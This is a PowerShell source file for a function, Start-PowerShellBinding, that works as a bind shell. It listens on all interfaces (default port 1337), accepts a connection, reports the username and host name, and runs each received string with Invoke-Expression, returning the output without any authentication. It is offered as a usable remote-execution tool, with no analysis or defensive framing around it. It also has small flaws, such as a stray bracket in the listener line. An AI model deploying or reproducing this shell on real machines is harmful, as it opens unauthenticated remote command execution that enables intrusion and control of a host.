function Start-PowerShellBinding {
    <#
    .SYNOPSIS
    Binds PowerShell to a specified port for remote command execution.

    .DESCRIPTION
    This function creates a TCP listener on a specified port, allowing remote PowerShell connections. It checks for port availability, starts the listener, and executes commands sent from the remote client.

    .PARAMETER Port
    Specifies the port number on which the PowerShell listener will be bound, default port is 1337.

    .EXAMPLE
    Start-PowerShellBinding -Verbose

    .NOTES
    v0.0.1
    #>
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = "Low")]
    param (
        [Parameter(Mandatory = $false, ValueFromPipeline = $false, HelpMessage = "Enter a port to listen on, valid ports are between 1 and 65535")]
        [ValidateRange(1, 65535)]
        [int32]$Port = 1337
    )
    $PortString = $Port.ToString()
    Write-Verbose -Message "Checking for availability of $PortString"
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpListeners()
    if ($Connections.Port -Contains "$Port") {
        throw "Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes!"
    }
    Write-Verbose -Message "Creating listener on port $PortString"
    $Listener = New-Object -TypeName System.Net.Sockets.TcpListener]('0.0.0.0', $Port)
    if ($PSCmdlet.ShouldProcess($Listener.Start())) {
        Write-Output ">>> PowerShell.exe is bound to port $PortString"
        try {
            while ($true) {
                Write-Verbose -Message "> Begin loop allowing Ctrl+C to stop the listener"
                if ($Listener.Pending()) {
                    $Client = $Listener.AcceptTcpClient()
                    break;
                }
                Start-Sleep -Seconds 2
            }
        }
        catch {
            Write-Error -Exception $_
        }
        finally {
            Write-Output ">>> Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
            if ($Listener.Pending()) {
                Write-Host ">>> Closing open port" -ForegroundColor DarkCyan
                $Client.Close()
                $Listener.Stop()
            }
        }
        Write-Output ">>> Connection Established"
        $Stream = $Client.GetStream()
        Write-Verbose "Streaming bytes to PowerShell connection"
        [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
        $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Logged into PowerShell as $env:USERNAME on $env:COMPUTERNAME `n`n")
        $Stream.Write($SendBytes, 0, $SendBytes.Length)
        $SendBytes = ([Text.Encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $Stream.Write($SendBytes, 0, $SendBytes.Length)
        Write-Verbose -Message "Begin command execution cycle"
        while (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $Data = $EncodedText.GetString($Bytes, 0, $i)
            try {
                $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)
            }
            catch {
                Write-Output "Failure occured attempting to execute the command on target."
                $Error[0] | Out-String
            }
            Write-Verbose -Message "Initial data send failed. Attempting a second time"
            $SendBack2 = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
            $x = ($Error[0] | Out-String)
            $Error.Clear()
            $SendBack2 = $SendBack2 + $x
            $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
            $Stream.Write($SendByte, 0, $SendByte.Length)
            $Stream.Flush()
        }
        Write-Verbose -Message "Terminating connection"
        $Client.Close()
        $Listener.Stop()
        Write-Verbose -Message "Connection closed"
    }
    else {
        Write-Output ">>> Start-Bind would have bound PowerShell to a listener on port $PortString"
    }
}
